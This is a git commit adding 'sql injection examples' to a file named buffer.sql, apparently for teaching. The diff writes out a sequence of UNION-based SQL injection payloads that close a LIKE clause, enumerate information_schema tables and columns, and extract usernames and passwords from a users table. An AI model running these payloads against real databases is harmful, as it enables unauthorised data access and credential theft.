0d29b229f74b8c683b642024cfa5c2748a0c8a97
brombaut <ben.rombaut@unb.ca>
2019-03-19 15:51:13 -0300

    Adding sql injection examples

--- buffer.sql
+++ buffer.sql
@@ -1,2 +1,11 @@
 SELECT (?, ?, ?) FROM ? WHERE ? LIKE '%val%';
 
+SELECT (?, ?, ?) FROM ? WHERE ? LIKE '%';--%';
+
+SELECT (?, ?, ?) FROM ? WHERE ? LIKE '%' UNION (SELECT 1, 2, 3 FROM dual);--%';
+
+SELECT (?, ?, ?) FROM ? WHERE ? LIKE '%' UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3 FROM information_schema.tables);--%';
+
+SELECT (?, ?, ?) FROM ? WHERE ? LIKE '%' UNION (SELECT COLUMN_NAME, 2, 3 FROM information_schema.columns WHERE TABLE_NAME = 'users');--%';\
+
+SELECT (?, ?, ?) FROM ? WHERE ? LIKE '%' UNION (SELECT username, password, first_name FROM users);--%';
